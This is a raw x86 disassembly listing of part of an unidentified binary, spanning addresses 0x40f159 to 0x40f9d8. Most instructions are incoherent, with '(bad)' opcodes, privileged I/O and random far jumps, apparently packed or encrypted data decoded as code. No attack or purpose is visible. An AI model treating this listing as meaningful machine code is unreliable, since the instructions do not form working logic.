  40f159:	lds    esp,FWORD PTR [ecx+0x1f8f8c03]
  40f15f:	pop    ss
  40f160:	cwde   
  40f161:	arpl   WORD PTR [edi-0x78],dx
  40f164:	xor    bh,bl
  40f166:	dec    BYTE PTR ss:[ebx]
  40f169:	or     DWORD PTR [eax],0xf05040fb
  40f16f:	cs xchg esp,eax
  40f171:	cld    
  40f172:	bound  eax,QWORD PTR [ebx]
  40f174:	pop    ds
  40f175:	add    DWORD PTR [eax],0xf5fb1511
  40f17b:	push   ss
  40f17c:	inc    BYTE PTR [eax-0x5547c10]
  40f182:	jnp    0x40f175
  40f184:	idiv   DWORD PTR [ebp+esi*8-0x2]
  40f188:	sbb    eax,0xa0f17bfa
  40f18d:	mov    bh,0xf5
  40f18f:	je     0x40f191
	...
  40f1a1:	add    BYTE PTR [eax],al
  40f1a3:	add    BYTE PTR [edi-0xd],dh
  40f1a6:	fs out 0x1d,al
  40f1a9:	cli    
  40f1aa:	cmc    
  40f1ab:	push   esp
  40f1ac:	sbb    bl,dh
  40f1ae:	jae    0x40f1ec
  40f1b0:	std    
  40f1b1:	stc    
  40f1b2:	hlt    
  40f1b3:	sbb    dl,BYTE PTR [eax+0x3c]
  40f1b6:	test   dh,0xfd
  40f1b9:	stc    
  40f1ba:	cli    
  40f1bb:	(bad)  
  40f1bc:	pop    eax
  40f1bd:	xchg   edx,eax
  40f1be:	jnp    0x40f14e
  40f1c0:	sbb    eax,0xa3aef480
  40f1c5:	mov    eax,fs
  40f1c7:	mov    edi,DWORD PTR [edx-0x5]
  40f1ca:	cmc    
  40f1cb:	ds out 0xd4,eax
  40f1ce:	or     al,0xe9
  40f1d0:	pop    edx
  40f1d1:	pmulhw mm5,QWORD PTR [edx+0x44]
  40f1d5:	call   FWORD PTR [ebp+0x13]
  40f1d8:	mov    BYTE PTR [esi+0x31],ch
  40f1db:	jle    0x40f180
  40f1dd:	mov    eax,fs
  40f1df:	ins    DWORD PTR es:[edi],dx
  40f1e0:	mov    edx,0x5360f5fb
  40f1e5:	clc    
  40f1e6:	and    DWORD PTR [esi*4+0xfe9474c],0x4fdd08ba
  40f1f1:	ins    BYTE PTR es:[edi],dx
  40f1f2:	or     edi,eax
  40f1f4:	dec    esi
  40f1f5:	xchg   esp,eax
  40f1f6:	pop    ebp
  40f1f7:	add    BYTE PTR ds:0xb500486d,bh
  40f1fd:	div    DWORD PTR [ebp-0x1f42698c]
  40f203:	sti    
  40f204:	or     esp,DWORD PTR [edi+esi*8]
  40f207:	or     eax,DWORD PTR [eax]
	...
  40f219:	add    BYTE PTR [eax],al
  40f21b:	add    BYTE PTR [ebp-0x64],ah
  40f21e:	movmskps edi,xmm5
  40f221:	xchg   esi,eax
  40f222:	or     bh,ch
  40f224:	cmp    ebx,DWORD PTR [eax-0x691b99fd]
  40f22a:	pop    eax
  40f22b:	call   DWORD PTR [eax]
  40f22d:	(bad)  
  40f22e:	in     eax,dx
  40f22f:	add    ecx,DWORD PTR [ebx]
  40f231:	and    eax,0xc369e8f7
  40f236:	cmc    
  40f237:	jmp    FWORD PTR [ecx-0x1f]
  40f23a:	mov    ch,0xb9
  40f23c:	push   0x25
  40f23e:	idiv   edi
  40f240:	inc    edi
  40f241:	je     0x40f280
  40f243:	pop    es
  40f244:	rcl    al,0xf6
  40f247:	jne    0x40f292
  40f249:	and    eax,0xa73d087d
  40f24e:	pop    edx
  40f24f:	dec    DWORD PTR [edx]
  40f251:	lds    edi,FWORD PTR [edi+0x5b9631c2]
  40f257:	mov    edi,ecx
  40f259:	adc    dl,cl
  40f25b:	call   0x4badbd06
  40f260:	je     0x40f1f2
  40f262:	or     BYTE PTR [ebp+0x31],dh
  40f265:	aas    
  40f266:	enter  0x250c,0x98
  40f26a:	or     BYTE PTR [edx+0x25],ch
  40f26d:	cwde   
  40f26e:	cmc    
  40f26f:	inc    DWORD PTR [eax]
  40f271:	cli    
  40f272:	pop    edi
  40f273:	add    BYTE PTR [edi-0x5a6a1f70],cl
  40f279:	nop
  40f27a:	or     BYTE PTR [ecx+0x75f70e20],cl
	...
  40f294:	ins    DWORD PTR es:[edi],dx
  40f295:	sbb    eax,0x628c54dd
  40f29a:	cwde   
  40f29b:	mov    BYTE PTR [ecx+0x47],dl
  40f29e:	cwde   
  40f29f:	je     0x40f275
  40f2a1:	push   edx
  40f2a2:	push   ds
  40f2a3:	cld    
  40f2a4:	ss mov edx,0xd5907498
  40f2aa:	or     DWORD PTR [edx-0x74],ebp
  40f2ad:	push   ebx
  40f2ae:	sbb    al,0x40
  40f2b0:	mov    ebx,gs
  40f2b2:	jbe    0x40f2f8
  40f2b4:	mov    al,ds:0x3600143b
  40f2b9:	jmp    0x40f2ce
  40f2bb:	adc    ah,BYTE PTR [esi]
  40f2bd:	jmp    0x40f257
  40f2bf:	je     0x40f251
  40f2c1:	xchg   edx,eax
  40f2c2:	(bad)  
  40f2c3:	xlat   BYTE PTR fs:[ebx]
  40f2c5:	sub    al,0xa
  40f2c7:	test   DWORD PTR [edx+esi*8+0x71],ecx
  40f2cb:	xchg   DWORD PTR [ebx+ebp*8-0x282674f7],ecx
  40f2d2:	jno    0x40f2e5
  40f2d4:	sbb    DWORD PTR [eax-0x1409b064],esi
  40f2da:	movhlps xmm4,xmm6
  40f2dd:	jmp    0x40f2f0
  40f2df:	xor    ch,dl
  40f2e1:	lods   al,BYTE PTR ds:[esi]
  40f2e2:	or     al,0xff
  40f2e4:	sar    DWORD PTR [edi],0x86
  40f2e7:	push   ecx
  40f2e8:	pushf  
  40f2e9:	push   0x2adb77cc
  40f2ee:	adc    al,dh
  40f2f0:	and    al,0xab
  40f2f2:	dec    eax
  40f2f3:	jmp    FWORD PTR [ebx]
  40f2f5:	test   BYTE PTR [edi],bh
  40f2f7:	call   0x40f2fc
	...
  40f30c:	xchg   edi,eax
  40f30d:	sub    edx,DWORD PTR [ecx]
  40f30f:	dec    eax
  40f310:	sbb    esp,DWORD PTR [eax-0x685f186c]
  40f316:	test   esi,edi
  40f318:	adc    eax,0x79fea8b0
  40f31d:	jnp    0x40f2b3
  40f31f:	push   edx
  40f320:	dec    edx
  40f321:	push   0xffffff85
  40f323:	(bad)  
  40f324:	jns    0x40f2ba
  40f326:	push   edi
  40f327:	(bad)  
  40f328:	pusha  
  40f329:	call   0xec1d0c84
  40f32e:	and    al,0x40
  40f330:	(bad)  
  40f332:	jmp    0x8c03:0xd79d5fc3
  40f339:	jmp    0x8c7982b3
  40f33e:	inc    edi
  40f33f:	mov    al,0x4b
  40f341:	stc    
  40f342:	es (bad) 
  40f344:	cmp    ah,ch
  40f346:	sbb    DWORD PTR cs:[eax-0x54046308],edi
  40f34d:	(bad)  
  40f34e:	mov    al,0x8e
  40f350:	call   0x939e:0xab9f9cf8
  40f357:	mov    cs,WORD PTR [edx+0x6b937cf8]
  40f35d:	or     DWORD PTR [ebx-0x62f38572],ebp
  40f363:	xchg   edi,eax
  40f364:	push   es
  40f365:	mov    ds:0xf86018ee,eax
  40f36a:	xor    esp,edi
  40f36c:	bound  eax,QWORD PTR [edx+0x9bdb]
	...
  40f382:	add    BYTE PTR [eax],al
  40f384:	push   ebp
  40f385:	fs (bad) 
  40f387:	mov    es,WORD PTR [ebx+edx*8-0x5]
  40f38b:	add    esp,ecx
  40f38d:	or     eax,esp
  40f38f:	mov    ?,WORD PTR [eax-0x2bbd3878]
  40f395:	mul    DWORD PTR [esi-0x277f0c06]
  40f39b:	sbb    eax,DWORD PTR [ebx-0x43fbdf92]
  40f3a1:	in     al,dx
  40f3a2:	scas   al,BYTE PTR es:[edi]
  40f3a3:	ss sbb edi,eax
  40f3a6:	das    
  40f3a7:	sbb    al,0xde
  40f3a9:	rcr    DWORD PTR [edi],cl
  40f3ab:	add    al,0x74
  40f3ad:	xchg   esp,eax
  40f3ae:	fistp  WORD PTR [esi-0x3bf792bf]
  40f3b4:	mov    cl,0x55
  40f3b6:	or     BYTE PTR [ecx],bl
  40f3b8:	add    eax,DWORD PTR [ecx+0x7ae55100]
  40f3be:	cmc    
  40f3bf:	pop    esi
  40f3c0:	pop    es
  40f3c1:	cmp    bl,BYTE PTR [edx+0x56]
  40f3c4:	or     dh,bh
  40f3c6:	jnp    0x40f3a5
  40f3c8:	test   DWORD PTR [ecx-0x74e5b9b0],0x6fe0b5c8
  40f3d2:	push   ss
  40f3d3:	iret   
  40f3d4:	push   eax
  40f3d5:	xchg   esp,eax
  40f3d6:	pop    eax
  40f3d7:	inc    ecx
  40f3d8:	and    eax,0x5f26f55e
  40f3dd:	ins    BYTE PTR es:[edi],dx
  40f3de:	mov    edx,0x60944f2a
  40f3e3:	jmp    0x81f7db77
	...
  40f3fc:	lods   al,BYTE PTR ds:[esi]
  40f3fd:	jno    0x40f446
  40f3ff:	jmp    0xf1bcebc3
  40f404:	daa    
  40f405:	loopne 0x40f479
  40f407:	test   BYTE PTR [ecx],0xef
  40f40a:	jg     0x40f3a6
  40f40c:	add    dh,dh
  40f40e:	mov    edi,0x5cf768ab
  40f413:	jb     0x40f441
  40f415:	adc    cl,ch
  40f417:	aad    0x76
  40f419:	xchg   esp,eax
  40f41a:	bound  ecx,QWORD PTR ds:0xd1008001
  40f420:	in     eax,0x47
  40f422:	cmc    
  40f423:	mov    esi,0x43f450c7
  40f428:	idiv   BYTE PTR es:[ebx-0x1f]
  40f42c:	pop    ss
  40f42d:	addr16 cmc 
  40f42f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f430:	sbb    DWORD PTR [ebp+0x29],ebp
  40f433:	sahf   
  40f434:	jnp    0x40f3c2
  40f436:	loopne 0x40f447
  40f438:	or     esi,esi
  40f43a:	cmc    
  40f43b:	add    ebx,DWORD PTR [esi+esi*8]
  40f43e:	jnp    0x40f440
  40f440:	std    
  40f441:	sbb    dl,BYTE PTR [edx-0x1]
  40f444:	or     BYTE PTR [ecx],0xf7
  40f447:	jne    0x40f3ca
  40f449:	or     DWORD PTR [ebp+0x8],edi
  40f44c:	or     eax,0x72ff45cf
  40f451:	cmp    ecx,eax
  40f453:	add    al,0xf5
  40f455:	mov    ebp,0x9f42ec81
  40f45a:	add    al,0xe8
  40f45c:	push   ebp
  40f45d:	shl    ebp,0xff
	...
  40f474:	mov    esi,0xdd2479d2
  40f479:	dec    esi
  40f47a:	outs   dx,BYTE PTR ds:[esi]
  40f47b:	inc    ecx
  40f47c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f47d:	ret    0x1ce0
  40f480:	sbb    cl,BYTE PTR [eax]
  40f482:	not    DWORD PTR [eax-0x3]
  40f485:	xchg   edx,eax
  40f486:	or     bh,ch
  40f488:	inc    ebx
  40f489:	cwde   
  40f48a:	pop    ebp
  40f48b:	data16 in al,0x92
  40f48e:	pop    eax
  40f48f:	(bad)  
  40f490:	clc    
  40f491:	cli    
  40f492:	in     eax,dx
  40f493:	pop    es
  40f494:	adc    DWORD PTR [ecx],ecx
  40f496:	imul   eax
  40f498:	(bad)
  40f49c:	lods   al,BYTE PTR ds:[esi]
  40f49d:	ror    BYTE PTR ds:0xe17d1800,cl
  40f4a3:	cmp    DWORD PTR [ecx],0x6
  40f4a6:	pusha  
  40f4a7:	add    BYTE PTR [edi+0x6d75f6c5],bh
  40f4ad:	sbb    bh,BYTE PTR [eax]
  40f4af:	push   eax
  40f4b0:	inc    edx
  40f4b1:	or     DWORD PTR [ecx+0x129c5145],eax
  40f4b7:	(bad)  
  40f4b8:	js     0x40f4b2
  40f4ba:	in     eax,dx
  40f4bb:	stos   BYTE PTR es:[edi],al
  40f4bc:	add    cl,BYTE PTR [ecx]
  40f4be:	imul   DWORD PTR [edx-0x7a]
  40f4c1:	pop    es
  40f4c2:	jge    0x40f4cc
  40f4c4:	std    
  40f4c5:	jno    0x40f4bd
  40f4c7:	inc    DWORD PTR [edx]
  40f4c9:	pushf  
  40f4ca:	adc    al,0xff
  40f4cc:	mov    WORD PTR [eax+0x6fae7f4],ds
  40f4d2:	test   esi,edi
  40f4d4:	or     edi,ecx
  40f4d6:	test   esi,edi
	...
  40f4ec:	jns    0x40f4f1
  40f4ee:	xchg   edx,eax
  40f4ef:	dec    ebx
  40f4f0:	pop    esp
  40f4f1:	jle    0x40f477
  40f4f3:	enter  0xefce,0x9
  40f4f7:	push   ebp
  40f4f8:	pop    ss
  40f4f9:	pusha  
  40f4fa:	mov    bl,al
  40f4fc:	in     al,0x3e
  40f4fe:	adc    BYTE PTR [eax],al
  40f500:	popfw  
  40f502:	xor    DWORD PTR [esp+eax*4+0x53],0xffffff94
  40f507:	dec    esi
  40f508:	retf   
  40f509:	dec    esi
  40f50a:	jb     0x40f550
  40f50c:	rol    BYTE PTR [edx+0x2c4456c6],0xa
  40f513:	xor    BYTE PTR [ebx-0x15],0x1d
  40f517:	inc    edi
  40f518:	xor    al,0xce
  40f51a:	sub    eax,DWORD PTR [ecx-0x74]
  40f51d:	ds xchg edx,eax
  40f51f:	adc    DWORD PTR [ebx-0x15],ebx
  40f522:	or     DWORD PTR [ebx],ecx
  40f524:	int3   
  40f525:	pop    ds
  40f526:	rcl    BYTE PTR [esi+0x74],1
  40f529:	add    eax,0x283ff26
  40f52e:	retf   0xac73
  40f531:	je     0x40f581
  40f533:	clc    
  40f534:	in     al,0xeb
  40f536:	or     edi,ebp
  40f538:	sub    ah,BYTE PTR [ebx+0x14]
  40f53b:	data16 int 0xeb
  40f53e:	xor    BYTE PTR [esp+edx*2-0x22],0x17
  40f543:	or     BYTE PTR [ecx+edx*2+0x5],ah
  40f547:	dec    DWORD PTR [ebx-0x32]
  40f54a:	pop    ss
  40f54b:	clc    
  40f54c:	xor    al,0xbb
  40f54e:	inc    DWORD PTR ds:[eax]
	...
  40f561:	add    BYTE PTR [eax],al
  40f563:	add    BYTE PTR [ebx],bh
  40f565:	aas    
  40f566:	fidivr WORD PTR [edi-0x17dda0b]
  40f56c:	sub    edx,DWORD PTR [ecx+edx*4+0x1c8d5b5a]
  40f573:	dec    ebp
  40f574:	sbb    bh,BYTE PTR [edi-0x65]
  40f577:	mov    ebx,DWORD PTR [eax+0x5ab1878c]
  40f57d:	cmc    
  40f57e:	mov    gs,WORD PTR [ebx]
  40f580:	aad    0xd1
  40f582:	jmp    0x40f587
  40f584:	popa   
  40f585:	or     DWORD PTR [edi+eax*4+0x1e1eefcf],ecx
  40f58c:	mov    WORD PTR [edx+0x2e],gs
  40f58f:	mov    ebx,DWORD PTR [eax-0x74]
  40f592:	push   edi
  40f593:	adc    ecx,DWORD PTR [ebx-0xb]
  40f596:	pop    esi
  40f597:	jge    0x40f5e1
  40f599:	clc    
  40f59a:	push   0xffffffc9
  40f59c:	bound  ecx,QWORD PTR [eax+eiz*4+0x3]
  40f5a0:	or     al,0xb5
  40f5a2:	fisttp WORD PTR [edi]
  40f5a4:	push   ebx
  40f5a5:	ins    BYTE PTR es:[edi],dx
  40f5a6:	int3   
  40f5a7:	and    DWORD PTR [ebp-0x6c],ecx
  40f5aa:	sahf   
  40f5ab:	fwait
  40f5ac:	add    eax,0x9703dfb6
  40f5b1:	aam    0x9b
  40f5b3:	fld    QWORD PTR [edx-0x14]
  40f5b6:	or     eax,0xeaf4932f
  40f5bb:	ret    
  40f5bc:	push   DWORD PTR [eax+edi*2-0x20827bbf]
  40f5c3:	add    ebp,DWORD PTR [ebx+0x33]
  40f5c6:	mov    BYTE PTR [ecx],dl
	...
  40f5dc:	jmp    0xeeec:0xe08adf55
  40f5e3:	adc    BYTE PTR [esp+edi*8-0xba4f22f],dl
  40f5ea:	ficom  WORD PTR [eax]
  40f5ec:	push   esp
  40f5ed:	std    
  40f5ee:	xlat   BYTE PTR ds:[ebx]
  40f5ef:	xor    al,0x4b
  40f5f1:	hlt    
  40f5f2:	retf   
  40f5f3:	(bad)  
  40f5f4:	add    ebp,DWORD PTR [esi]
  40f5f6:	mov    bh,0x8a
  40f5f8:	cmp    dh,ah
  40f5fa:	or     BYTE PTR [ebx+0x340dabd5],bh
  40f600:	fnstcw WORD PTR [ebx+0x8]
  40f603:	jmp    0x17a2280e
  40f608:	outs   dx,BYTE PTR ds:[esi]
  40f609:	push   ebp
  40f60a:	or     BYTE PTR [ecx],al
  40f60c:	xlat   BYTE PTR ds:[ebx]
  40f60d:	jns    0x40f656
  40f60f:	jmp    0x91415f2a
  40f614:	jmp    FWORD PTR [esi-0xb]
  40f617:	jle    0x40f5b2
  40f619:	xchg   esp,eax
  40f61a:	pusha  
  40f61b:	imul   BYTE PTR [ebp+0x4a010855]
  40f621:	jns    0x40f66a
  40f623:	jmp    0xb21a9f3e
  40f628:	push   eax
  40f629:	xchg   esp,eax
  40f62a:	loopne 0x40f669
  40f62c:	mov    ds:0x4c60f5f3,eax
  40f631:	add    BYTE PTR [ebx-0x17],ah
  40f634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f635:	and    BYTE PTR [edi-0x58],ch
  40f638:	(bad)  
  40f639:	jl     0x40f5dd
  40f63b:	iret   
  40f63c:	dec    eax
  40f63d:	xchg   esp,eax
  40f63e:	cmc    
  40f63f:	hlt    
	...
  40f654:	loop   0x40f6b1
  40f656:	inc    edi
  40f657:	jmp    0x1e9e2463
  40f65c:	push   es
  40f65d:	sbb    eax,0x94711d4c
  40f662:	pusha  
  40f663:	jno    0x40f612
  40f665:	push   ebp
  40f666:	or     BYTE PTR [ecx-0x16b8861f],dl
  40f66c:	push   es
  40f66d:	test   al,0xd9
  40f66f:	mov    eax,ds:0x49e094c8
  40f674:	mov    ebx,0xa370f5f3
  40f679:	in     al,0x83
  40f67b:	and    al,0x2c
  40f67d:	arpl   WORD PTR [eax-0x78],sp
  40f680:	scas   al,BYTE PTR es:[edi]
  40f681:	push   ebp
  40f682:	or     BYTE PTR [ecx-0x16],al
  40f685:	jns    0x40f6ce
  40f687:	add    BYTE PTR ds:0x7dd33d1c,dh
  40f68d:	push   edi
  40f68e:	or     al,ch
  40f690:	mov    eax,ds:0xacfff5a4
  40f695:	mov    bl,0xe0
  40f697:	sub    DWORD PTR [eax+0x4],0xfffffff6
  40f69b:	jae    0x40f6fa
  40f69d:	sbb    DWORD PTR [ebp-0x10],esi
  40f6a0:	and    eax,0x98834aa3
  40f6a5:	or     al,0xf6
  40f6a7:	jae    0x40f672
  40f6a9:	mov    es,WORD PTR [edi]
  40f6ab:	add    BYTE PTR [edx],cl
  40f6ad:	pop    esi
  40f6ae:	div    BYTE PTR [ebp-0x13]
  40f6b1:	push   cs
  40f6b2:	repz dec ebp
  40f6b4:	jp     0x40f6d3
  40f6b6:	div    DWORD PTR [ebp+0x0]
	...
  40f6c9:	add    BYTE PTR [eax],al
  40f6cb:	add    BYTE PTR [ecx+0x1d],al
  40f6ce:	jge    0x40f6d8
  40f6d0:	cmp    eax,0x3aff46aa
  40f6d5:	sbb    eax,0xa35af07d
  40f6da:	add    al,ch
  40f6dc:	repnz lods al,BYTE PTR ds:[esi]
  40f6de:	cmc    
  40f6df:	(bad)  
  40f6e0:	jp     0x40f685
  40f6e2:	in     al,0xff
  40f6e4:	lock out dx,al
  40f6e6:	in     eax,dx
  40f6e7:	cmp    al,0xb
  40f6e9:	sbb    al,0xf7
  40f6eb:	inc    DWORD PTR [eax]
  40f6ed:	adc    esi,edi
  40f6ef:	jne    0x40f76e
  40f6f1:	sbb    eax,0x9a8d087d
  40f6f6:	inc    esi
  40f6f7:	call   FWORD PTR [edx-0x621382e5]
  40f6fd:	out    0x58,eax
  40f6ff:	(bad)  
  40f700:	jp     0x40f71f
  40f702:	jge    0x40f6f8
  40f704:	(bad)  
  40f705:	out    dx,eax
  40f706:	pop    eax
  40f707:	(bad)  
  40f708:	jp     0x40f727
  40f70a:	jge    0x40f6fc
  40f70c:	cmp    eax,0x3aff5799
  40f711:	sbb    eax,0xd38ce87d
  40f716:	test   BYTE PTR [edi+0x4b],cl
  40f719:	jecxz  0x40f69b
  40f71b:	je     0x40f75d
  40f71d:	fild   DWORD PTR [esi]
  40f71f:	or     BYTE PTR [edx+eiz*2],ah
  40f722:	xor    bh,bh
  40f724:	xor    ecx,DWORD PTR [ebx-0x46f3e4f]
  40f72a:	mov    esi,DWORD PTR es:[eax]
  40f72d:	jg     0x40f6e4
  40f72f:	sti    
	...
  40f744:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f745:	sti    
  40f746:	adc    eax,DWORD PTR [eax+0x13]
  40f749:	xchg   ecx,eax
  40f74a:	hlt    
  40f74b:	out    0x9d,eax
  40f74d:	xchg   ecx,eax
  40f74e:	jg     0x40f74e
  40f750:	adc    eax,0x8c6980c1
  40f755:	test   DWORD PTR [eax+ebp*2],ecx
  40f758:	shl    BYTE PTR [ecx-0x48bffb7],cl
  40f75e:	or     DWORD PTR [eax],eax
  40f760:	or     al,0x44
  40f762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f763:	push   edx
  40f764:	fist   DWORD PTR [edx-0xc]
  40f767:	mov    edi,0xe83c9e58
  40f76c:	pop    ss
  40f76d:	es cmp esi,0x1905bb97
  40f774:	pop    esp
  40f775:	ret    
  40f776:	or     DWORD PTR [eax],eax
  40f778:	mov    ds:0x32d91169,eax
  40f77d:	cmp    al,0xa
  40f77f:	push   eax
  40f780:	mov    ds:0xffe7f210,eax
  40f785:	xor    al,0x81
  40f787:	(bad)  
  40f788:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f789:	addr16 cmp edi,edi
  40f78c:	mov    esp,DWORD PTR [edx+0x7083fc06]
  40f792:	icebp  
  40f793:	out    0x8b,eax
  40f795:	inc    ecx
  40f796:	cmp    esi,0xfff5bd45
  40f79c:	shl    BYTE PTR [esi-0x63],0x82
  40f7a0:	dec    eax
  40f7a1:	xchg   esp,eax
  40f7a2:	jmp    0x40f7d3
  40f7a4:	out    0x94,al
  40f7a6:	pop    ecx
  40f7a7:	inc    ebp
	...
  40f7bc:	push   ebx
  40f7bd:	addr16 out 0x9b,eax
  40f7c0:	std    
  40f7c1:	pop    esi
  40f7c2:	mov    BYTE PTR [edi+0x7bcb5714],0x78
  40f7c9:	dec    ecx
  40f7ca:	aaa    
  40f7cb:	inc    ebp
  40f7cc:	mov    WORD PTR [edi+edi*8],ss
  40f7cf:	add    esp,DWORD PTR [eax-0x5677b8ac]
  40f7d5:	push   ebx
  40f7d6:	fild   QWORD PTR [esi]
  40f7d8:	and    al,0xc7
  40f7da:	rol    DWORD PTR [ebx],cl
  40f7dc:	mov    WORD PTR [ebp+0x49af109f],ds
  40f7e2:	xchg   ebp,ebx
  40f7e4:	gs icebp 
  40f7e6:	mov    ?,ebx
  40f7e8:	cmp    ebp,DWORD PTR [eax-0x18]
  40f7eb:	xor    esp,DWORD PTR [esp+edx*4-0x21]
  40f7ef:	xchg   esi,eax
  40f7f0:	sub    DWORD PTR [ecx+eiz*8+0x1e],edi
  40f7f4:	dec    ebp
  40f7f5:	xchg   esp,eax
  40f7f6:	scas   eax,DWORD PTR es:[edi]
  40f7f7:	xchg   BYTE PTR [eax-0x64],ah
  40f7fa:	push   edi
  40f7fb:	aad    0x54
  40f7fd:	icebp  
  40f7fe:	pop    esi
  40f7ff:	pushf  
  40f800:	test   DWORD PTR [esi+eax*2-0x79],eax
  40f804:	(bad)  
  40f805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f806:	pop    ds
  40f807:	dec    ebp
  40f808:	mov    edx,0xbd8736f0
  40f80d:	inc    ecx
  40f80e:	clc    
  40f80f:	(bad)  
  40f810:	and    ah,dl
  40f812:	adc    DWORD PTR es:[eax-0x4c046b10],esp
  40f819:	adc    BYTE PTR [ebp+0x28509286],ah
  40f81f:	ret    0x0
	...
  40f832:	add    BYTE PTR [eax],al
  40f834:	(bad)  
  40f835:	xchg   esp,eax
  40f836:	mov    esp,0x2414777a
  40f83b:	mov    dl,ah
  40f83d:	jp     0x40f81e
  40f83f:	sbb    esi,ecx
  40f841:	out    dx,eax
  40f842:	or     BYTE PTR [edi+eiz*2-0x8],bh
  40f846:	inc    edi
  40f847:	pushf  
  40f848:	or     ch,bh
  40f84a:	jg     0x40f878
  40f84c:	add    al,0x1b
  40f84e:	xor    al,0x36
  40f850:	nop
  40f851:	push   ebp
  40f852:	or     BYTE PTR [ecx+0x52],ch
  40f855:	lock jns 0x40f881
  40f858:	mov    al,ds:0x90286d82
  40f85d:	inc    edi
  40f85e:	loopne 0x40f8a5
  40f860:	inc    esp
  40f861:	lock cmc 
  40f863:	loop   0x40f8b4
  40f865:	sub    DWORD PTR fs:[esi],edx
  40f868:	add    BYTE PTR [eax],ch
  40f86a:	push   eax
  40f86b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f86c:	adc    bl,BYTE PTR [ebx+0x602115c8]
  40f872:	pusha  
  40f873:	jmp    0x1f7f807
  40f878:	icebp  
  40f879:	jbe    0x40f8c2
  40f87b:	jmp    0xf1bce83f
  40f880:	pop    ss
  40f881:	xor    BYTE PTR [ecx+0x76],dh
  40f884:	adc    bh,al
  40f886:	mov    edi,0xf4ef0b1e
  40f88b:	sbb    dl,al
  40f88d:	sub    al,0xf6
  40f88f:	pop    esi
  40f890:	or     ch,bh
  40f892:	cli    
  40f893:	xchg   edi,edx
  40f895:	xchg   esi,eax
  40f896:	jnp    0x40f8c1
	...
  40f8ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8ad:	mov    bl,0xe0
  40f8af:	cmc    
  40f8b0:	imul   ebp,edi,0xfffffff5
  40f8b3:	repnz iret 
  40f8b5:	arpl   WORD PTR [ecx+eax*8],bp
  40f8b8:	scas   al,BYTE PTR es:[edi]
  40f8b9:	jbe    0x40f902
  40f8bb:	jmp    0xbad1f51f
  40f8c0:	adc    ch,bh
  40f8c2:	pop    eax
  40f8c3:	xchg   ecx,eax
  40f8c4:	(bad)  
  40f8c5:	xchg   esp,eax
  40f8c6:	in     eax,0x57
  40f8c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8c9:	lea    ebp,[ebp-0x58]
  40f8cc:	pop    DWORD PTR [ebp+esi*8+0x0]
  40f8d0:	clc    
  40f8d1:	jmp    0x40f8c0
  40f8d3:	or     DWORD PTR ds:0xf1e8f716,0xffffffa6
  40f8da:	cmc    
  40f8db:	dec    DWORD PTR [edi]
  40f8dd:	repnz in eax,dx
  40f8df:	fst    QWORD PTR [esi+0x250bf719]
  40f8e5:	test   BYTE PTR [eax+ebp*2],ch
  40f8e8:	mov    ss,WORD PTR [ecx+0x10850047]
  40f8ee:	popa   
  40f8ef:	push   ebx
  40f8f0:	push   edx
  40f8f1:	sbb    DWORD PTR [esi+0x68],eax
  40f8f4:	and    eax,0xcdbee593
  40f8f9:	sti    
  40f8fa:	outs   dx,BYTE PTR ds:[esi]
  40f8fb:	inc    ecx
  40f8fc:	xor    eax,0x1d75f5a3
  40f901:	or     ebx,DWORD PTR [edx+0x78]
  40f904:	repnz sbb dh,ch
  40f907:	pop    ebp
  40f908:	mov    dl,0x19
  40f90a:	idiv   edi
  40f90c:	cwde   
  40f90d:	sbb    al,0xf7
  40f90f:	jne    0x40f911
	...
  40f921:	add    BYTE PTR [eax],al
  40f923:	add    ch,bh
  40f925:	or     al,dh
  40f927:	dec    esp
  40f928:	jb     0x40f943
  40f92a:	push   edi
  40f92b:	leave  
  40f92c:	aaa    
  40f92d:	xchg   esp,eax
  40f92e:	or     BYTE PTR [ebp+0x6e],dl
  40f931:	or     al,0x8b
  40f933:	les    esi,FWORD PTR ds:0x15f04c67
  40f939:	sbb    BYTE PTR [ebp+0xc],bh
  40f93c:	dec    ebp
  40f93d:	cmp    DWORD PTR [edx-0x1],ebx
  40f940:	push   edx
  40f941:	in     eax,dx
  40f942:	mov    ch,0x74
  40f944:	mov    bh,0x13
  40f946:	jne    0x40f944
  40f948:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f949:	mov    al,ds:0x1af88b29
  40f94e:	ins    BYTE PTR es:[edi],dx
  40f94f:	sbb    DWORD PTR [ebp-0x738ad83a],0x72107d19
  40f959:	lahf   
  40f95a:	add    al,ch
  40f95c:	mov    WORD PTR [eax-0x607c00d1],?
  40f962:	add    eax,0x81717bfc
  40f967:	(bad)  
  40f968:	stc    
  40f969:	jecxz  0x40f8fc
  40f96b:	hlt    
  40f96c:	xlat   BYTE PTR ds:[ebx]
  40f96d:	out    0x8c,al
  40f96f:	mov    ecx,cs
  40f971:	jmp    0x40f9ac
  40f973:	call   0xfeccaa11
  40f978:	inc    ebp
  40f979:	cmp    bh,dh
  40f97b:	jmp    eax
  40f97d:	jb     0x40f91c
  40f97f:	or     BYTE PTR [eax-0x3c],0xf
  40f983:	add    BYTE PTR [esi+0x748bba],ah
	...
  40f999:	add    BYTE PTR [eax],al
  40f99b:	add    BYTE PTR [ebx+eax*8+0x272b4bd4],al
  40f9a2:	jae    0x40f9e8
  40f9a4:	and    BYTE PTR [edx+0xc],dl
  40f9a7:	push   0xffffff8c
  40f9a9:	add    ecx,0x66
  40f9ac:	int    0xfb
  40f9ae:	adc    DWORD PTR [edx],eax
  40f9b0:	mov    ebx,?
  40f9b2:	mov    edi,esp
  40f9b4:	std    
  40f9b5:	lods   al,BYTE PTR ds:[esi]
  40f9b6:	mov    edi,esi
  40f9b8:	xchg   DWORD PTR [ebx],edi
  40f9ba:	push   es
  40f9bb:	aas    
  40f9bc:	add    eax,0x116784b9
  40f9c1:	lahf   
  40f9c2:	dec    ecx
  40f9c3:	add    bl,ah
  40f9c5:	call   0xb2d6e14b
  40f9ca:	or     al,0x0
  40f9cc:	xchg   DWORD PTR [ebx-0x2f34dcfb],edi
  40f9d2:	and    edi,0xfe8d2417
  40f9d8:	pop    esp
